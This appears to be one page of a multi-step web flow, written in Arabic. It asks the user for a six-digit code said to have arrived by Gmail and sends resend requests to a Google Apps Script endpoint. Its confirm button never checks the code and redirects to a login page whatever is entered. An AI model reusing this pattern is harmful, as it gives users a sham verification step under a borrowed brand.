<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { 
            font-family: sans-serif; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            background-color: #EAF0E9; 
            min-height: 100vh;
        }

        .main-content {
            width: 100%;
            max-width: 400px;
            padding: 40px 15px; 
            display: flex; 
            flex-direction: column; 
            align-items: center;
        }

        .instruction-text {
            font-size: 16px; 
            font-weight: bold;
            color: #000;
            margin-bottom: 30px;
            text-align: center;
            white-space: nowrap; 
            width: 100%;
        }

        .otp-container {
            display: flex;
            justify-content: space-between;
            width: 100%;
            gap: 5px;
            margin-bottom: 35px;
            direction: ltr;
        }

        .otp-container input {
            width: 14%;
            aspect-ratio: 1 / 1.2;
            text-align: center;
            font-size: 22px;
            font-weight: bold;
            border: 1px solid #c8d1c7;
            border-radius: 12px;
            background-color: #ffffff;
            outline: none;
        }

        .otp-container input:focus {
            border: 2px solid #2EAF4A;
        }

        .action-btn {
            width: 100%;
            background-color: #ffffff;
            color: #ccc;
            border: 1px solid #c8d1c7;
            padding: 18px;
            border-radius: 15px;
            font-size: 20px;
            font-weight: bold;
            cursor: not-allowed;
            margin-bottom: 25px;
            transition: 0.3s;
        }

        .action-btn.active {
            background-color: #2EAF4A;
            color: #ffffff;
            border: none;
            cursor: pointer;
        }

        .resend-link {
            font-size: 18px;
            font-weight: bold;
            color: #000;
            text-decoration: none;
            cursor: pointer;
            transition: 0.3s;
        }

        .resend-link.disabled {
            color: #999;
            cursor: not-allowed;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <div class="main-content">
        <div class="instruction-text">إدخلوا رمز التأكيد الذي توصلتم به في رسالة Gmail</div>

        <div class="otp-container" id="otpFields">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
            <input type="number" pattern="[0-9]*" inputmode="numeric">
        </div>

        <button id="submitOtp" class="action-btn" disabled>تأكيد</button>

        <div id="resendRequest" class="resend-link">إعادة إرسال الرمز</div>
    </div>

<script>
    const inputs = document.querySelectorAll('#otpFields input');
    const btn = document.getElementById('submitOtp');
    const resendBtn = document.getElementById('resendRequest');
    
    // رابط السكريبت الخاص بإرسال الرسائل
    const scriptURL = 'https://script.google.com/macros/s/AKfycbyOMFtHG90rbzL8_dnr7RVaF3Uz8zGAO_d_vgt7LpqxOQq1HWqwHPoCAmEmUXqSD-bhPA/exec';

    // 1. دعم اللصق والتنقل
    inputs[0].addEventListener('paste', (e) => {
        const data = e.clipboardData.getData('text').trim();
        if (data.length === 6 && !isNaN(data)) {
            data.split('').forEach((char, index) => { inputs[index].value = char; });
            inputs[5].focus();
            updateButtonState();
        }
    });

    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
            if (e.target.value !== "" && index < inputs.length - 1) inputs[index + 1].focus();
            updateButtonState();
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === "" && index > 0) inputs[index - 1].focus();
        });
    });

    function updateButtonState() {
        const code = Array.from(inputs).map(i => i.value).join('');
        if (code.length === 6) {
            btn.disabled = false;
            btn.classList.add('active');
        } else {
            btn.disabled = true;
            btn.classList.remove('active');
        }
    }

    // 2. وظيفة إرسال الرمز عند الضغط على "إعادة إرسال"
    resendBtn.addEventListener('click', async () => {
        const email = localStorage.getItem('storedEmail'); // جلب الإيميل المحفوظ من الصفحة الأولى
        
        if (!email) {
            alert("لم يتم العثور على البريد الإلكتروني، يرجى العودة للخطوة الأولى.");
            return;
        }

        // تعطيل الزر مؤقتاً لمنع التكرار
        resendBtn.classList.add('disabled');
        resendBtn.innerText = "جاري إعادة الإرسال...";

        try {
            // إرسال الطلب للسكريبت
            await fetch(`${scriptURL}?email=${encodeURIComponent(email)}&action=resend`);
            
            // تنبيه المستخدم بالنجاح
            alert("تم إرسال رمز جديد إلى بريدك بنجاح.");
            
            // مؤقت بسيط (مثلاً 10 ثواني) قبل السماح بالضغط مرة أخرى
            let counter = 10;
            const timer = setInterval(() => {
                resendBtn.innerText = `إعادة الإرسال بعد (${counter})`;
                counter--;
                if (counter < 0) {
                    clearInterval(timer);
                    resendBtn.innerText = "إعادة إرسال الرمز";
                    resendBtn.classList.remove('disabled');
                }
            }, 1000);

        } catch (error) {
            console.error("Error:", error);
            resendBtn.innerText = "فشل الإرسال، حاول ثانية";
            resendBtn.classList.remove('disabled');
        }
    });

    btn.addEventListener('click', () => {
        btn.innerText = "جاري التحقق...";
        setTimeout(() => { window.location.href = "../login/"; }, 800);
    });
</script>

</body>
</html>
